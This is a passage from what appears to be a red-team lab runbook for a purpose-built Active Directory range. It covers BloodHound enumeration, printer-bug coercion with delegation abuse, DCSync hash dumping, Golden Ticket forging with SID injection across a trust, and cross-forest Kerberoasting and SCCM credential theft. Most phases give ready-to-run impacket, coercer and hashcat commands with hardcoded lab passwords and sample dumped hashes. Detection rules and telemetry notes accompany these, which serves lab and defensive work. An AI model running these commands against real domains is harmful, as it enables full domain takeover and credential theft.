Resolved Collection Methods: Group, Sessions, LoggedOn, ACL, ObjectProps, Default, ComputerStatus, UserRights, Trusts, IsComputerObjectRisky, SPNTargets, Desktops, RegistrySessions, NTLMRegistry, DCOM, LocalGroups
[+] Beginning enumeration...
[+] Listing domains for strategy...
[+] OU: CN=Computers,DC=child,DC=cadre,DC=local
[+] User: Administrator@child.cadre.local
[+] Computer: dc01.cadre.local
... (5-10 minutes)
[+] Compressing 768 objects and 1247 ACEs into /tmp/20260624_bloodhound.zip
```

### What to expect (failure modes)
- **LDAP bind fails (invalid credentials)**: Verify password. Or use 3.5A/3.5B to get the right credential.
- **Collection hangs at "Listing domains"**: DNS issue. Verify `192.168.77.11` is reachable, dc02 is the right KDC.
- **Empty result zip**: Wrong domain. child.cadre.local for our test, not cadre.local.
- **Permission denied on a specific object**: Some OUs may have restrictive ACLs. Use `-d` flag to control.

### CADRE-specific notes
- **From Kali**: Use `analyst_cloud:Cl0ud_An@lyst!` (from 3.5A) — works for LDAP-only collection
- **From mbr01 (3.5B)**: Use SharpHound `-c All` for session data
- **CADRE's BloodHound queries of interest** (per CAMPAIGNS.md):
  - `MATCH p=(u:User {name:"SVC_MSSQL@CHILD.CADRE.LOCAL"})-[r]->(target) RETURN p` — what can svc_mssql do
  - `MATCH p=(u:User)-[r:ForceChangePassword]->(t:User) RETURN p` — all ForceChangePassword paths
  - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c` — unconstrained delegation targets
  - `MATCH (ct:CertTemplate) WHERE ct.requiresmanagerapproval=false RETURN ct` — ADCS ESC vulnerabilities

### Telemetry fingerprint
- **WinSec 4662** (directory service object accessed): high volume — every AD object BloodHound touches
- **WinSec 4624** (logon): LDAP bind for the analyst_cloud user
- **Zeek ldap.log**: hundreds of LDAP queries in short time
- **Sysmon EID 1** (ProcessCreate): SharpHound.exe
- **Sysmon EID 3** (network connect): SharpHound → DC:389 (LDAP) + DC:445 (SMB for sessions)

### Detection engineering
- **Volume rule**: >1000 LDAP queries from single source IP in 5 min = enumeration
- **4662 pattern**: 4662 on every object in a domain = SharpHound
- **Suricata**: LDAP `searchRequest` burst from single source
- **Elastic rule (planned)**: SharpHound signature: `event.code:4662` with `ldap_display_name:*` (all object types) from same source

### Common pitfalls
- **Wrong DC IP**: child.cadre.local = dc02 (192.168.77.11), cadre.local = dc01 (192.168.77.10)
- **Stale creds**: After 3.5A reset, password is what was set. If `Cl0ud_An@lyst!` was the original and we didn't reset, use that.
- **No session data**: SharpHound `-c Group,ACL,Trust` doesn't include sessions. Need `-c All` from domain-joined host.
- **Large output**: BloodHound zips can be 50+ MB. Allocate disk space.
- **Neo4j database**: Need BloodHound CE GUI to visualize. Install via Docker or use neo4j directly.

### Reproduction checklist
- [ ] analyst_cloud credential (from 3.5A)
- [ ] Network reachability to dc02:389 (LDAP) + dc02:445 (SMB)
- [ ] SharpHound or bloodhound-python installed on Kali
- [ ] Collection completes (5-10 min)
- [ ] zip file has `_computers.json`, `_users.json`, `_groups.json`, `_gpos.json`, `_ous.json`, `_domains.json`
- [ ] Import into BloodHound CE
- [ ] Run sample queries (see CADRE-specific notes)

---

## Mechanics: Phase 5 — Lateral Movement (Coercion + Delegation)

**Status:** Partially tested. WT017 (PrinterBug) confirmed (12 fires). WT018/019/020 non-functional on Server 2025.

### Why it works
**Coercion** forces a target machine to authenticate back to a server we control. **Unconstrained delegation** on our server captures the incoming TGT. The captured TGT = full credential of the coerced user (e.g., a DC machine account = Domain Admin).

#### The chain
1. **mbr01** has `TrustedForDelegation = true` (unconstrained delegation) — set in `05-ad-attack-surface.yml`
2. **Coercer** from Kali forces `dc02$` to authenticate to `mbr01` via MS-RPRN (PrinterBug)
3. `mbr01`'s LSASS captures `dc02$`'s TGT submission
4. **krbrelayx** or **Rubeus** extracts the TGT
5. TGT for `dc02$` = child domain admin → DCSync to child.cadre.local DA

#### Why PrinterBug works but PetitPotam/DFSCoerce/ShadowCoerce don't
- **MS-RPRN (PrinterBug, WT017)**: Direct TCP transport, RPC opnum 1/65. Suricata SID:1000050 detects it.
- **MS-EFSR (PetitPotam, WT018)**: SMB-pipe transport. `\PIPE\efsrpc` is blocked on Server 2025.
- **MS-DFSNM (DFSCoerce, WT019)**: SMB-pipe DCE-RPC. Suricata 8.0.5 doesn't decode the DCE-RPC over SMB.
- **MS-FSRVP (ShadowCoerce, WT020)**: Service not available on Server 2025.
- **UnCanny Coerce (WT094)**: New technique via `InstallService`. Requires Developer Mode.

### Attack commands
```bash
# Step 1 — Start Rubeus monitor on mbr01 (via 3.5B/3.5C, as SYSTEM)
# Or from Kali: use krbrelayx
python3 krbrelayx.py -hashes :<ntlm_hash_of_mbr01$> -dc-ip 192.168.77.11 \
    -spn krbtgt/CHILD.CADRE.LOCAL -target-ip 192.168.77.11

# Step 2 — Trigger coercion from Kali
coercer coerce -l 192.168.77.22 -t 192.168.77.11 \
    -d child.cadre.local \
    -u svc_mssql -p 's3rv1c3_MSSQL!' \
    --spoolsample

# Step 3 — Wait for capture, then use the captured TGT
export KRB5CCNAME=/tmp/dc02.ccache
impacket-secretsdump child.cadre.local/ -k -no-pass -dc-ip 192.168.77.11
```

### What to expect (success)
```
[*] SpoolService tried to authenticate to our listener with kerberos auth
[+] Saved TGT for dc02$@CHILD.CADRE.LOCAL at /tmp/dc02.ccache
[*] Dumping Domain Secrets
Administrator:500:aad3b435...:e02bc503339d51f71d913c245d35b50b:::
krbtgt:502:aad3b435...:hash:::
... (full domain secrets)
```

### What to expect (failure modes)
- **No TGT captured**: SpoolService disabled. Restart it with `Set-Service Spooler -StartupType Automatic && Start-Service Spooler`.
- **`SpoolService did not connect`**: Firewall on mbr01 blocking inbound 445/SMB. Verify.
- **PetitPotam (WT018) returns `STATUS_ACCESS_DENIED`**: `\PIPE\efsrpc` is disabled on Server 2025. Use WT017 instead.
- **DFSCoerce/ShadowCoerce not in Coercer**: Server 2025 blocked them. Use the `--spoolsample` flag only.

### CADRE-specific notes
- **mbr01** has `TrustedForDelegation = true` (per `05-ad-attack-surface.yml` line for unconstrained delegation)
- **Print Spooler on dc02**: Required for WT017. Set by `04-vulnerabilities.yml` (`-EnablePrintSpooler`).
- **dc01 is the root DC** — attacking dc02$ gives child DA. To get root DA, need cross-forest (Phase 7) or attack dc01$ directly (harder).
- **Suricata SID:1000050** fires on the coercion (12 confirmed fires in lab)

### Telemetry fingerprint
- **WinSec 4624** (logon) on mbr01: Type 3 (network) for dc02$ — coerced auth
- **WinSec 4662** (object access): RPC calls
- **Zeek dce_rpc.log**: opnum 1, 65 (MS-RPRN) from provisioning to dc02
- **Zeek kerberos.log**: AS-REQ for krbtgt/CHILD.CADRE.LOCAL from dc02$ to mbr01
- **Suricata SID:1000050**: 12 confirmed fires in lab

### Detection engineering
- **Suricata SID:1000050** (MS-RPRN coercion): confirmed working
- **Suricata SID:1000051-1000053** (EFSR/DFSNM/FSRVP): broken on Server 2025
- **Elastic rule**: `event.code:4624 AND logon_type:3 AND target_user_name:*$` (machine account auth) from unexpected source
- **Zeek**: `dce_rpc.opnum IN (1, 65)` from non-DC source = coercion signal

### Common pitfalls
- **Coercer version**: `coercer` (not `coercer.py`) — current syntax is `coercer coerce -l <listener> -t <target> --spoolsample`
- **Wrong target**: dc01 (root) is the long-term goal. dc02 (child) is the first step.
- **Listener not on mbr01**: For unconstrained delegation capture, listener MUST be on a host with `TrustedForDelegation`. mbr01 is the only one in CADRE.
- **TGT not saved**: Check Rubeus monitor output. If you see "SpoolService tried to authenticate" but no save, the KDC rejected the ticket.

### Reproduction checklist
- [ ] SYSTEM on mbr01 (Phase 3 chain)
- [ ] mbr01 has unconstrained delegation (BloodHound)
- [ ] Print Spooler running on dc02
- [ ] coercer installed on Kali
- [ ] Rubeus monitor running on mbr01
- [ ] Coercion fires, TGT captured
- [ ] DCSync with captured TGT succeeds

---

### Mechanics: WT018-020 — Non-functional Coercion [TESTED — FAILED]

**Status:** ❌ All three fail on Server 2025. Documented as deprecated techniques.

#### Why they don't work
- **WT018 (MS-EFSR PetitPotam)**: `\PIPE\efsrpc` blocked on Server 2025 (CVE-2021-36942 mitigated). Use WT017 instead.
- **WT019 (MS-DFSNM DFSCoerce)**: SMB-pipe DCE-RPC not decoded by Suricata 8.0.5. No telemetry, no detection rule.
- **WT020 (MS-FSRVP ShadowCoerce)**: FSRVP service not available on Server 2025.

#### CADRE-specific notes
- All three tested in lab (2026-05-29)
- Suricata SID:1000051-1000053 deployed but 0 fires
- WT017 (MS-RPRN PrinterBug) is the only working coercion in Server 2025
- WT094 (UnCanny) is the modern alternative but requires Developer Mode

---


## Mechanics: Phase 6 — Privilege Escalation (DCSync — WT009)

**Status:** Ready to test. Prereq: any DA-cred OR DCSync rights. Phase 5 (coercion) feeds into this.

### Why it works
DCSync abuses the AD replication protocol (MS-DRSR). Any account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (or the bundled `Replicating Directory Changes` extended right) can request a full domain dump from a DC.

The attacker impersonates a DC and asks the real DC to replicate the domain. The DC returns all user/computer hashes including the `krbtgt` account. The `krbtgt` hash = Golden Ticket forging = persistent DA for the domain.

Two sub-techniques:
- **DCSync via replication (most common)**: Use secretsdump.py to ask DC for replication
- **DCSync via ntdsutil + manual replication**: Rare, used when secretsdump is blocked

### Attack commands
```bash
# Once you have any DA-cred (from Phase 5 coercion or Phase 7 Golden Ticket)
export KRB5CCNAME=/tmp/dc02.ccache  # captured TGT from Phase 5
impacket-secretsdump -just-dc child.cadre.local/ -k -no-pass -dc-ip 192.168.77.11
# OR with NTLM hash:
impacket-secretsdump -just-dc 'child.cadre.local/Administrator@192.168.77.11' \
    -hashes :<ntlm_hash>
```

### What to expect (success)
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:d6c2a05bcf04ed8a39b73c5f50c4f7e0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:hash_here:::
svc_mssql:1111:aad3b435b51404eeaad3b435b51404ee:<hash>:::
... (all user/computer hashes)
```

The `krbtgt` hash is the crown jewel — you can forge Golden Tickets.

### What to expect (failure modes)
- **`STATUS_ACCESS_DENIED`**: Account doesn't have DCSync rights. Need DA or explicit ACE#13+14.
- **Connection refused on dc02:135**: DC firewall or RPC service down.
- **`KDC_ERR_WRONG_REALM`**: Wrong DC. Use dc02 for child.cadre.local.
- **secretsdump crashes**: Outdated impacket. Update to latest.

### CADRE-specific notes
- **ACE#13+14 (eng_agentic → DC=cadre: GetChanges+All)** is an alternative DCSync path WITHOUT being DA — see CAMPAIGNS.md Branch A.
- **Phase 5 (coercion)** captures `dc02$` TGT → use that TGT for DCSync via kerberos auth
- **Phase 7 (Golden Ticket)** uses the DCSync output (`krbtgt` hash) to forge tickets
- **DCSync chains**: Phase 5 → Phase 6 → Phase 7 (coercion → DCSync → Golden Ticket)

### Telemetry fingerprint
- **WinSec 4662** (DS object accessed): high — every object replicated
- **WinSec 4624** (logon) Type 3 (network) from attacker IP
- **WinSec 4673** (privileged operation): sensitive privilege used
- **Zeek dce_rpc.log**: DRSUAPI opnum 3 (DRSGetNCChanges) from non-DC source
- **Zeek kerberos.log**: AS-REQ from attacker machine account (if using TGT)
- **Suricata SID:1000002** (DCSync): 63 confirmed fires in lab

### Detection engineering
- **Suricata SID:1000002** (DCSync): confirmed working, 63 fires in lab
- **Elastic rule (planned)**: `event.code:4662 AND object_name:*CN=Configuration* AND access_mask:0x100` from non-DC source
- **Zeek alert**: `dce_rpc.opnum == 3` (DRSGetNCChanges) from non-DC source

### Common pitfalls
- **`secretsdump` requires DA OR explicit DCSync rights** — verify the creds have either
- **Wrong DC**: child.cadre.local uses dc02 (192.168.77.11). cadre.local uses dc01 (192.168.77.10).
- **Stale Kerberos ticket**: After coercing dc02$, export KRB5CCNAME immediately. Tickets have ~10 hour lifetime.
- **`-just-dc` vs full dump**: `-just-dc` only extracts hashes. Without it, also extracts cached creds, LSA secrets, etc. Use `-just-dc` for cleaner output.

### Reproduction checklist
- [ ] DA-cred obtained (Phase 5 or Branch A)
- [ ] KRB5CCNAME exported (or NTLM hash ready)
- [ ] DC reachable on port 135 + 445 + dynamic RPC
- [ ] secretsdump runs without errors
- [ ] `krbtgt` hash captured (write down — this is the crown jewel)
- [ ] All user/computer hashes captured

---

## Mechanics: Phase 7 — Forest Trust Escalation (WT010-012 Golden/Silver/Diamond Ticket)

**Status:** Ready to test. Prereq: `krbtgt` hash from Phase 6 DCSync.

### Why it works
Kerberos tickets are signed by the KDC. Once you have the `krbtgt` hash, you can forge ANY ticket that the real KDC would issue:
- **TGT** (Golden Ticket): domain-wide DA. Survives credential resets.
- **TGS** (Silver Ticket): service-specific. No KDC contact needed.
- **Diamond Ticket**: modifies a legitimate TGT (less anomalous than Golden).

#### CADRE's specific path
- child.cadre.local ↔ cadre.local has **SID Filtering: OFF** (verified in `01-core-ad.yml:50`)
- Forge child TGT with root's Enterprise Admins (EA) SID injected via `-extra-sid`
- Use the ticket to access cadre.local resources as EA
- This gives **root domain DA** = entire forest compromise

### Attack commands
```bash
# Step 1 — Get root EA SID (from child DC, using DA cred)
impacket-lookupsid -hashes :<child_admin_nthash> \
    child.cadre.local/Administrator@192.168.77.11
# Look for S-1-5-21-...-519 (Enterprise Admins)

# Step 2 — Forge Golden Ticket with root EA SID injection
impacket-ticketer -nthash <child_krbtgt_hash> \
    -domain-sid <child_sid> \
    -domain child.cadre.local \
    -extra-sid <root_EA_SID> \
    Administrator

# Step 3 — Use the forged ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec cadre.local/Administrator@dc01.cadre.local -k -no-pass
```

### What to expect (success)
```
[*] Creating basic skeleton ticket and adding attributes
[*] Encrypted ticket saved to Administrator.ccache
[*] Wrote ticket to Administrator.ccache
[*] Trying to connect to dc01.cadre.local
[!] Shell opening...
nt authority\system  ← or whoever the service runs as on dc01
```

### What to expect (failure modes)
- **KRB_AP_ERR_MODIFIED**: TGT signature wrong. Verify `child_krbtgt_hash` is correct (not rc4/aes mix-up).
- **KDC_ERR_POLICY**: SID Filtering blocked. Verify `SIDFilteringQuarantined = $false` on the trust.
- **KDC_ERR_TGT_REVOKED**: TGT was revoked. Re-forge.

### CADRE-specific notes
- **SID Filter: OFF** (per `01-core-ad.yml:50` — `SIDFilteringQuarantined = $false`)
- **Forest trust**: cadre.local ↔ child.cadre.local, bidirectional
- **EA SID format**: `S-1-5-21-<root-domain-SID>-519` (519 = EA group RID)
- **CADRE's specific attack**: forge child TGT with root EA SID → access dc01 as EA
- **Survives credential resets**: only defeated by rotating `krbtgt` password TWICE

### Telemetry fingerprint
- **Zeek kerberos.log**: TGS-REQ with referral across trust — inter-realm TGT
- **WinSec 4624** Type 3 (network) on dc01 with EA-equivalent group membership
- **Suricata**: cross-realm Kerberos traffic

### Detection engineering
- **Elastic rule (planned)**: inter-realm TGT requests from non-DC source
- **4662 on ForeignSecurityPrincipals container**: SID injection signal
- **Referral pattern**: TGS-REQ without preceding AS-REQ = forged ticket indicator

### Common pitfalls
- **Wrong hash type**: krbtgt AES256 ≠ RC4. Use the right hash for the encryption type.
- **Missing extra-sid**: Forged TGT without `-extra-sid` = only DA of child. For root EA, need root EA SID.
- **Rotated krbtgt**: After the lab's krbtgt rotation, old tickets fail. Re-DCSync.
- **AES vs RC4 mismatch**: Modern KDCs default to AES. secretsdump outputs `aes256_cts_hmac_sha1_96` and `rc4_hmac` — use the AES one.

### Reproduction checklist
- [ ] krbtgt hash from Phase 6 DCSync
- [ ] root EA SID (via lookupsid)
- [ ] impacket-ticketer succeeds
- [ ] psexec to dc01 works as EA

---

## Mechanics: Phase 8 — Cross-Forest + External Domain (WT033-039)

**Status:** Ready to test. Prereq: cadre.local DA (from Phase 7 Golden Ticket).

### Why it works
CADRE has a forest trust between `cadre.local` ↔ `range.local`. With cadre.local DA, you can:
1. **Cross-forest Kerberoast** (WT033): request TGS for range.local SPNs from cadre.local
2. **SCCM NAA extraction** (WT034): use svc_sccm (cracked from Kerberoast) to extract NAA creds
3. **svc_naa is DA in range.local** (over-privileged)
4. **DCSync to dc03** (range.local's DC) → all 3 domains compromised

### Attack commands
```bash
# Step 1 — Cross-forest Kerberoast (from Kali, using cadre.local DA cred)
impacket-GetUserSPNs cadre.local/chief_command:'C0mm@nd_Ch1ef!' \
    -target-domain range.local -dc-ip 192.168.77.12 -request
# Get TGS for svc_sccm

# Step 2 — Crack svc_sccm hash
hashcat -m 19700 svc_sccm.hash /path/to/cadre_passwords.txt
# Expected: s3rv1c3_SCCM!

# Step 3 — NAA extraction
# Read bait file on mbr02 vault share
smbclient //192.168.77.23/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
    -c "get naa-rotation-notice.txt"
# Returns: RANGE\svc_naa : N@A_s3rv1c3!

# Step 4 — svc_naa is DA in range.local
impacket-psexec range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12

# Step 5 — DCSync range.local
impacket-secretsdump -just-dc range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
```

### What to expect (success)
```
$krb5tgs$23$*svc_sccm$RANGE.LOCAL*mbr02.range.local*$hash...:$
s3rv1c3_SCCM!  # cracked

RANGE\svc_naa : N@A_s3rv1c3!  # from NAA bait file

[*] Dumping Domain Credentials
range.local\Administrator:500:hash:::
range.local\krbtgt:502:hash:::
... (full range.local secrets)
```

### What to expect (failure modes)
- **Cross-forest Kerberoast returns 0 hashes**: Wrong target domain. Use `-target-domain range.local`.
- **NAA bait file not found**: SCCM not configured. Check `10-sccm-verify.yml`.
- **svc_naa is not DA**: NAA over-privilege not configured. Check playbook.

### CADRE-specific notes
- **range.local** is the third domain (forest 2) — dc03 (192.168.77.12), mbr02 (192.168.77.23)
- **SCCM site**: mbr02 (site code `CAD`)
- **NAA config**: per `10-sccm-verify.yml` — NAA over-privileged as DA
- **svc_sccm is SCCM Full Admin** on the CAD site
- **svc_naa is range.local DA** (per ACE#23 — analyst_osint → svc_naa: GenericAll)
- **mbr02 has CLR enabled + TRUSTWORTHY ON** for alternative SQL execution (WT042)

### Telemetry fingerprint
- **WinSec 4624** Type 3 (network): inter-forest Kerberos auth
- **WinSec 4662**: SCCM NAA credential access
- **WinSec 4673**: privileged operation on NAA
- **WinSec 7045** (new service): SCCM service install
- **Zeek kerberos.log**: cross-realm TGS-REQ
- **Suricata**: cross-forest Kerberos pattern

### Detection engineering
- **Inter-forest TGS requests**: Unusual — flag for review
- **SCCM NAA access**: should be rare, alert on every read
- **Cross-forest DCSync**: see Phase 6

### Common pitfalls
- **Wrong DC IP**: range.local = dc03 (192.168.77.12), not cadre.local's dc01
- **Trust direction**: cadre.local → range.local (impacket uses `-target-domain`)
- **SCCM not configured**: Check `10-sccm-verify.yml` ran

### Reproduction checklist
- [ ] cadre.local DA (Phase 7)
- [ ] Cross-forest Kerberoast succeeds
- [ ] svc_sccm hash cracked
- [ ] NAA bait file accessible
- [ ] svc_naa is DA in range.local
- [ ] DCSync range.local succeeds
- [ ] All 3 domains compromised

---
